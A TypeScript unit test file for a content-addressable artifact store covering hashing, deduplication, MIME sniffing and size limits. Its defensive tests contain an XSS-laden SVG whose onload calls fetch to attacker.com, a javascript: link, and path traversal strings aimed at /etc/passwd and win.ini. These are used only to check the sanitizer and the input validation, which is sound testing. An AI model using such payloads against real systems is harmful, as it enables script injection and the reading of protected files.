import { test, describe } from 'node:test';
import assert from 'node:assert';
import * as fs from 'node:fs';
import * as path from 'node:path';
import * as os from 'node:os';
import { ArtifactStore, detectMimeType, sanitizeSvg } from '../src/artifact-store.ts';

describe('ArtifactStore Content-Addressable Storage, Atomic Store & P5 Capabilities', () => {
  let testStoreDir: string;
  let store: ArtifactStore;

  test('Setup dynamic temporary CAS store directory', () => {
    testStoreDir = fs.mkdtempSync(path.join(os.tmpdir(), 'union-bot-cas-test-'));
    store = new ArtifactStore(testStoreDir, 5 * 1024 * 1024); // 5MB limit for testing
    assert.ok(fs.existsSync(testStoreDir));
  });

  test('Stores and retrieves arbitrary binary data with verified SHA256 hash', () => {
    const originalContent = Buffer.from('%PDF-1.4 Mock PDF Content For Union Bot Handoff Verification\nTest Bytes 123456');
    const expectedSha256 = ArtifactStore.hashBuffer(originalContent);

    const metadata = store.storeBytes(
      originalContent,
      'application/pdf',
      'original_bytes',
      {
        sourceActor: 'antigravity',
        provider: 'local',
        captureMethod: 'filesystem',
        timestamp: new Date().toISOString(),
      },
      'specification_v1.pdf'
    );

    assert.strictEqual(metadata.sha256, expectedSha256);
    assert.strictEqual(metadata.byteSize, originalContent.length);
    assert.strictEqual(metadata.mimeType, 'application/pdf');
    assert.strictEqual(metadata.fidelity, 'original_bytes');
    assert.strictEqual(metadata.transferState, 'local_verified');
    assert.strictEqual(metadata.deduplicated, false);
    assert.ok(store.hasArtifact(expectedSha256));

    const retrievedBytes = store.readBytes(expectedSha256);
    assert.strictEqual(retrievedBytes.length, originalContent.length);
    assert.deepStrictEqual(retrievedBytes, originalContent);
  });

  test('Deduplicates identical byte content without recreating file', () => {
    const content = Buffer.from('Duplicate byte content for test');
    const meta1 = store.storeBytes(content, 'text/plain', 'original_bytes', {
      sourceActor: 'user',
      provider: 'local',
      captureMethod: 'user_manual',
      timestamp: new Date().toISOString(),
    });
    assert.strictEqual(meta1.deduplicated, false);

    const meta2 = store.storeBytes(content, 'text/plain', 'original_bytes', {
      sourceActor: 'codex',
      provider: 'local',
      captureMethod: 'auto_captured',
      timestamp: new Date().toISOString(),
    });
    assert.strictEqual(meta2.deduplicated, true);
    assert.strictEqual(meta2.sha256, meta1.sha256);
  });

  test('Detects MIME type from magic bytes accurately (P5-001)', () => {
    // PNG
    const png = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00]);
    assert.strictEqual(detectMimeType(png, 'unknown/mime'), 'image/png');

    // JPEG
    const jpeg = Buffer.from([0xff, 0xd8, 0xff, 0xe0]);
    assert.strictEqual(detectMimeType(jpeg), 'image/jpeg');

    // GIF
    const gif = Buffer.from('GIF89a\x01\x00\x01\x00');
    assert.strictEqual(detectMimeType(gif), 'image/gif');

    // WebP
    const webp = Buffer.from('RIFF\x00\x00\x00\x00WEBPVP8 ');
    assert.strictEqual(detectMimeType(webp), 'image/webp');

    // PDF
    const pdf = Buffer.from('%PDF-1.7 document bytes');
    assert.strictEqual(detectMimeType(pdf), 'application/pdf');

    // SVG
    const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><circle r="10"/></svg>');
    assert.strictEqual(detectMimeType(svg), 'image/svg+xml');

    // JSON
    const json = Buffer.from('{"name": "union-bot", "p5": true}');
    assert.strictEqual(detectMimeType(json), 'application/json');
  });

  test('Sanitizes SVG to neutralize XSS and script injection attacks (P5-010)', () => {
    const maliciousSvg = `
      <svg xmlns="http://www.w3.org/2000/svg">
        <script>alert("pwned")</script>
        <circle cx="50" cy="50" r="40" onload="fetch('http://attacker.com')" />
        <a href="javascript:alert(1)"><text>Click me</text></a>
      </svg>
    `;
    const cleanSvg = sanitizeSvg(maliciousSvg);
    assert.ok(!cleanSvg.includes('<script>'), 'Must strip <script>');
    assert.ok(!cleanSvg.includes('alert("pwned")'), 'Must strip script body');
    assert.ok(!cleanSvg.includes('onload='), 'Must strip onload attribute');
    assert.ok(!cleanSvg.includes('javascript:'), 'Must strip javascript: URL');
    assert.ok(cleanSvg.includes('<circle'), 'Must preserve safe elements');
  });

  test('Enforces maximum artifact size limit fail-closed (P5-012)', () => {
    const largeBuffer = Buffer.alloc(6 * 1024 * 1024); // 6MB > 5MB limit
    assert.throws(() => {
      store.storeBytes(largeBuffer, 'application/octet-stream', 'original_bytes', {
        sourceActor: 'user',
        provider: 'local',
        captureMethod: 'user_manual',
        timestamp: new Date().toISOString(),
      });
    }, /ERR_FILE_TOO_LARGE/);
  });

  test('Fails retrieval with clear error if SHA256 does not exist', () => {
    const bogusHash = '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef';
    assert.throws(() => {
      store.readBytes(bogusHash);
    }, /not found in store/);
  });

  test('Rejects path traversal attempts in readBytes (P5-010)', () => {
    const maliciousPaths = [
      '../../etc/passwd',
      '..\\..\\windows\\win.ini',
      '../test',
      'a/../../../secret.txt',
      '0123456789abcdef/../../etc/passwd',
    ];

    for (const badHash of maliciousPaths) {
      assert.throws(() => {
        store.readBytes(badHash);
      }, /Invalid SHA256 digest format/);
    }
  });

  test('Generates export manifest with byte sizes and existence checks (P5-011)', () => {
    const content = Buffer.from('Manifest test content');
    const meta = store.storeBytes(content, 'text/plain', 'original_bytes', {
      sourceActor: 'user',
      provider: 'local',
      captureMethod: 'user_manual',
      timestamp: new Date().toISOString(),
    });

    const bogusHash = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
    const manifest = store.generateManifest([meta.sha256, bogusHash]);

    assert.strictEqual(manifest.length, 2);
    assert.strictEqual(manifest[0].sha256, meta.sha256);
    assert.strictEqual(manifest[0].exists, true);
    assert.strictEqual(manifest[0].byteSize, content.length);
    assert.strictEqual(manifest[1].sha256, bogusHash);
    assert.strictEqual(manifest[1].exists, false);
  });
});
